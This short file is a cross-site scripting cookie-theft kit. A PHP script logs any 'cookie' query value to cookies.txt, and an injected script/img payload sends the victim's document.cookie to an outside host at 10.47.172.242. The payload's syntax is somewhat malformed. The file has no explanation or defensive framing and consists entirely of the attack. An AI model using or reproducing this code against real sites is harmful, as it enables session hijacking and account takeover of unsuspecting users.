<?php
$cookie = $_GET['cookie'];
$log = fopen("cookies.txt", "a");
fwrite($log, $cookie ."\n");
fclose($log);
?>

).<script><img src="http://10.47.172.242/cookie/index.php?cookie="+document.cookie/></script>
